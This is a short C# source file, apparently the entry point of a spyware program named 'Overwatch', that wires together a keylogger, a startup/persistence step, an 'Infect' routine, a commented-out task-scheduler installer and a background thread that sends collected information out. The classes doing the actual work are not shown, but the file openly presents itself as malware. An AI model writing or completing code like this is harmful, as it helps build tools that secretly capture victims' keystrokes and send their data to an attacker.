using System;
using System.Threading;

namespace Overwatch
{
    class cMain
    {
        static appLog Log = new appLog();
        static cReceiveInformation info = new cReceiveInformation();
        static cKeylogger k = new cKeylogger();
        //static cInstallTaskScheduler T = new cInstallTaskScheduler();
        static cSendingInformation s = new cSendingInformation();
        private static Thread SendingThread = new Thread(s.Sending);
        static void Main(string[] args)
        {
            try
            {
                cStartupOptions.ProcessStartInfo();
                cChangeLabel.Infect(args);
                cThread t = new cThread();
                t.Start();
                SendingThread.Start();
            }
            catch (Exception ex) { Log.Write(ex.Message, true); }
        }
    }
}
